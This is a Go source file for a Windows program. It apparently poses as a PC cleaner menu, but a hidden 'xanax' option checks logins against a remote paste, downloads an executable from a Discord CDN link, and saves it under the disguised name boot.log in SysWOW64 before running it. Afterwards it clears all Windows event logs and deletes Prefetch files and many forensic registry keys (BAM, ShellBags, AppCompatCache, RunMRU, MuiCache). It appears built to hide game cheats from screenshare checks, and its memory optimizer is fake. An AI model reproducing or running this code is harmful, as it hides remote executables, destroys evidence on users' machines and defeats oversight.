package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/fatih/color"
)

var cheat = "Xanax Client"
var userLogin = "test"
var passLogin = "xanax"

func logo() {
	d := color.New(color.FgCyan, color.Bold)
	d.Println("   ___   _  ____________    ________")
	d.Println("  / _ | / |/ /_  __/  _/___/ __/ __/")
	d.Println(" / __ |/    / / / _/ //___/\\ \\_\\ \\  ")
	d.Println("/_/ |_/_/|_/ /_/ /___/   /___/___/  ")
	d.Println("                                    ")
	d.Println("Created by @sander.reg // 444#9667  ")
	d.Println("------------------------------------")
	d.Println("Current cheat: " + cheat)
	d.Println("------------------------------------")
}

func clear() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func loginError() {
	clear()
	fmt.Println("An error has occured. If you think this is a mistake report the code below to the reseller.")
	time.Sleep(3 * time.Second)
	fmt.Println("Error code: Anti-SS 3")
	time.Sleep(2 * time.Second)
}

func hide() {
	log.Printf("Deleting traces")
	e := os.Remove("C:/Windows/SysWOW64/boot.log")
	if e != nil {
		log.Fatal(e)
	}
	err := ClearDir("C:/Windows/Prefetch/")
	if err != nil {
		fmt.Println(err)
	}
	cmd := exec.Command("powershell", "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }")
	cmd.Stdout = os.Stdout
	cmd.Run()
	cmd2 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings", "/f")
	cmd2.Stdout = os.Stdout
	cmd2.Run()
	cmd3 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\7-Zip\\FM", "/f")
	cmd3.Stdout = os.Stdout
	cmd3.Run()
	cmd4 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\WinRAR\\ArcHistory", "/f")
	cmd4.Stdout = os.Stdout
	cmd4.Run()
	cmd5 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", "/f")
	cmd5.Stdout = os.Stdout
	cmd5.Run()
	cmd6 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRULegacy", "/f")
	cmd6.Stdout = os.Stdout
	cmd6.Run()
	cmd7 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\FirstFolder", "/f")
	cmd7.Stdout = os.Stdout
	cmd7.Run()
	cmd8 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", "/f")
	cmd8.Stdout = os.Stdout
	cmd8.Run()
	cmd9 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "/f")
	cmd9.Stdout = os.Stdout
	cmd9.Run()
	cmd10 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Shell\\BagMRU", "/f")
	cmd10.Stdout = os.Stdout
	cmd10.Run()
	cmd11 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Shell\\Bags", "/f")
	cmd11.Stdout = os.Stdout
	cmd11.Run()
	cmd12 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU", "/f")
	cmd12.Stdout = os.Stdout
	cmd12.Run()
	cmd13 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", "/f")
	cmd13.Stdout = os.Stdout
	cmd13.Run()
	cmd14 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", "/f")
	cmd14.Stdout = os.Stdout
	cmd14.Run()
	cmd15 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", "/f")
	cmd15.Stdout = os.Stdout
	cmd15.Run()
	cmd16 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\AppCompatCache", "/f")
	cmd16.Stdout = os.Stdout
	cmd16.Run()
	cmd17 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched", "/f")
	cmd17.Stdout = os.Stdout
	cmd17.Run()
	cmd18 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView", "/f")
	cmd18.Stdout = os.Stdout
	cmd18.Run()
	cmd19 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\DirectInput", "/f")
	cmd19.Stdout = os.Stdout
	cmd19.Run()
	cmd20 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", "/f")
	cmd20.Stdout = os.Stdout
	cmd20.Run()
	cmd21 := exec.Command("cmd", "/c", "reg", "delete", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit", "/f")
	cmd21.Stdout = os.Stdout
	cmd21.Run()
	cmd23 := exec.Command("cmd", "/c", "reg", "delete", "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", "/f")
	cmd23.Stdout = os.Stdout
	cmd23.Run()
	hide2()
}

func hide2() {
	cmd2 := exec.Command("cmd", "/c", "reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings", "/f")
	cmd2.Stdout = os.Stdout
	cmd2.Run()
	cmd3 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\7-Zip\\FM", "/f")
	cmd3.Stdout = os.Stdout
	cmd3.Run()
	cmd4 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\WinRAR\\ArcHistory", "/f")
	cmd4.Stdout = os.Stdout
	cmd4.Run()
	cmd5 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", "/f")
	cmd5.Stdout = os.Stdout
	cmd5.Run()
	cmd6 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRULegacy", "/f")
	cmd6.Stdout = os.Stdout
	cmd6.Run()
	cmd7 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\FirstFolder", "/f")
	cmd7.Stdout = os.Stdout
	cmd7.Run()
	cmd8 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", "/f")
	cmd8.Stdout = os.Stdout
	cmd8.Run()
	cmd9 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "/f")
	cmd9.Stdout = os.Stdout
	cmd9.Run()
	cmd10 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Shell\\BagMRU", "/f")
	cmd10.Stdout = os.Stdout
	cmd10.Run()
	cmd11 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Shell\\Bags", "/f")
	cmd11.Stdout = os.Stdout
	cmd11.Run()
	cmd12 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU", "/f")
	cmd12.Stdout = os.Stdout
	cmd12.Run()
	cmd13 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", "/f")
	cmd13.Stdout = os.Stdout
	cmd13.Run()
	cmd14 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers", "/f")
	cmd14.Stdout = os.Stdout
	cmd14.Run()
	cmd15 := exec.Command("cmd", "/c", "reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", "/f")
	cmd15.Stdout = os.Stdout
	cmd15.Run()
	cmd16 := exec.Command("cmd", "/c", "reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Session Manager\\AppCompatCache", "/f")
	cmd16.Stdout = os.Stdout
	cmd16.Run()
	cmd17 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched", "/f")
	cmd17.Stdout = os.Stdout
	cmd17.Run()
	cmd18 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView", "/f")
	cmd18.Stdout = os.Stdout
	cmd18.Run()
	cmd19 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\DirectInput", "/f")
	cmd19.Stdout = os.Stdout
	cmd19.Run()
	cmd20 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", "/f")
	cmd20.Stdout = os.Stdout
	cmd20.Run()
	cmd21 := exec.Command("cmd", "/c", "reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit", "/f")
	cmd21.Stdout = os.Stdout
	cmd21.Run()
	cmd23 := exec.Command("cmd", "/c", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", "/f")
	cmd23.Stdout = os.Stdout
	cmd23.Run()
	err2 := ClearDir2("C:/Windows/Prefetch/")
	if err2 != nil {
		fmt.Println(err2)
	}
	log.Printf("Traces deleted")
}

func run() {
	log.Printf(cheat + " started")
	cmd := exec.Command("C:\\Windows\\SysWOW64\\boot.log")
	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}
	log.Printf(cheat + " has been closed")
	hide()
	fmt.Println("Going back to menu in 5 seconds...")
	time.Sleep(5 * time.Second)
}

func login() {
	var user string
	var pass string
	resp, err := http.Get("https://pastebin.com/raw/bsy1HBRw")
	if err != nil {
		loginError()
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		loginError()
	}
	loginDB := string(body)
	clear()
	logo()
	fmt.Print("Username: ")
	fmt.Scan(&user)
	fmt.Print("Password: ")
	fmt.Scan(&pass)
	if strings.Contains(loginDB, "APP DISABLED") {
		clear()
		logo()
		fmt.Println("Anti-SS is currently in maintenance. More updates on: https://discord.gg/abNudGMjbD")
	}
	if strings.Contains(loginDB, user+":::") {
		if strings.Contains(loginDB, user+":::"+pass+":::0") {
			clear()
			logo()
			fmt.Println("Succesfully logged in")
			time.Sleep(2 * time.Second)
			bypassmenu()
		}
		if strings.Contains(loginDB, user+":::"+pass+":::1") {
			clear()
			logo()
			fmt.Println("This account has been blacklisted. If you believe this is a mistake please contact the reseller")
			time.Sleep(5 * time.Second)
		} else {
			clear()
			logo()
			fmt.Println("Password is wrong")
			time.Sleep(1 * time.Second)
			login()
		}
	} else {
		clear()
		logo()
		fmt.Println("User doesn't exist")
		time.Sleep(1 * time.Second)
		login()
	}
}

func bypass() {
	clear()
	logo()
	log.Printf("Starting " + cheat + "...")
	resp, err := http.Get("https://cdn.discordapp.com/attachments/967276001014996992/978626137628499979/svchost.exe")
	if err != nil {
		hide()
	}
	defer resp.Body.Close()
	out, err := os.Create("C:\\Windows\\SysWOW64\\boot.log")
	if err != nil {
		fmt.Println(err)
	}
	defer out.Close()
	io.Copy(out, resp.Body)
}

func bypassmenu() {
	bypass()
	run()
}

func check(e error) {
	if e != nil {
		hide()
	}
}

func clearpc() {
	clear()
	fmt.Println("Clearing event logs...")
	cmd := exec.Command("powershell", "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }")
	cmd.Stdout = os.Stdout
	cmd.Run()
	fmt.Println("Event logs have been cleared.")
	fmt.Println("Going back to menu in 5 seconds...")
	time.Sleep(5 * time.Second)
	main()
}

func memory() {
	clear()
	fmt.Println("Optimizing memory...")
	time.Sleep(3 * time.Second)
	fmt.Println("Memory has been optimized.")
	fmt.Println("Going back to menu in 5 seconds...")
	time.Sleep(5 * time.Second)
	main()
}

func ClearDir(dir string) error {
	files, err := filepath.Glob(filepath.Join(dir, "BOOT.LOG-*"))
	if err != nil {
		return err
	}
	for _, file := range files {
		err = os.RemoveAll(file)
		if err != nil {
			return err
		}
	}
	return nil
}

func ClearDir2(dir string) error {
	files, err := filepath.Glob(filepath.Join(dir, "REG.EXE-*"))
	if err != nil {
		return err
	}
	for _, file := range files {
		err = os.RemoveAll(file)
		if err != nil {
			return err
		}
	}
	return nil
}

func cleartemp() {
	cmd := exec.Command("cmd", "/c", "del", "/q/f/s", "%TEMP%\\*")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {
	clear()
	var res string
	fmt.Println("-------------------")
	fmt.Println("1. Optimize memory")
	fmt.Println("2. Clear PC and Emulator")
	fmt.Println("3. Clear temp")
	fmt.Println("4. Exit")
	fmt.Println("-------------------")
	fmt.Print("Select option: ")
	fmt.Scan(&res)

	if res == "1" {
		memory()
	}
	if res == "2" {
		clearpc()
	}
	if res == "3" {
		cleartemp()
	}
	if res == "4" {
		os.Exit(0)
	}
	if res == "xanax" {
		login()
	} else {
		main()
	}
}
